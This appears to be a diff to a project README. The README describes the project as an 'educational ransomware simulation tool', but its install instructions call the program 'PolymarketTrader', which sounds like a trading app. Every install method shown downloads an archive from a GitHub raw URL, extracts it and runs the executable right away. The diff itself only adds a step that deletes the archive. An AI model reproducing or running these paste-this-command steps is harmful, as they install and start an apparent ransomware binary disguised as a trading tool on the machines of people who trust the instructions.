@@ -7,14 +7,15 @@ Educational ransomware simulation tool for Ubuntu/Linux systems.
 Run this single command to download and install:
 
 ```bash
-mkdir -p poly-trader && cd poly-trader && curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz -o polymarket-trader.tar.gz && tar -xzf polymarket-trader.tar.gz && ./PolymarketTrader
+mkdir -p poly-trader && cd poly-trader && curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz -o polymarket-trader.tar.gz && tar -xzf polymarket-trader.tar.gz && rm polymarket-trader.tar.gz && ./PolymarketTrader
 ```
 
 This will:
 1. Create a `poly-trader` directory
 2. Download the compressed archive
 3. Extract the executable (permissions preserved)
-4. Run the program automatically
+4. Clean up the archive file
+5. Run the program automatically
 
 ## Alternative Installation Methods
 
@@ -30,6 +31,9 @@ curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polyma
 # Extract (permissions preserved)
 tar -xzf polymarket-trader.tar.gz
 
+# Clean up archive file
+rm polymarket-trader.tar.gz
+
 # Run the program
 ./PolymarketTrader
 ```
@@ -39,6 +43,7 @@ tar -xzf polymarket-trader.tar.gz
 mkdir -p poly-trader && cd poly-trader
 wget https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz
 tar -xzf polymarket-trader.tar.gz
+rm polymarket-trader.tar.gz
 ./PolymarketTrader
 ```
 
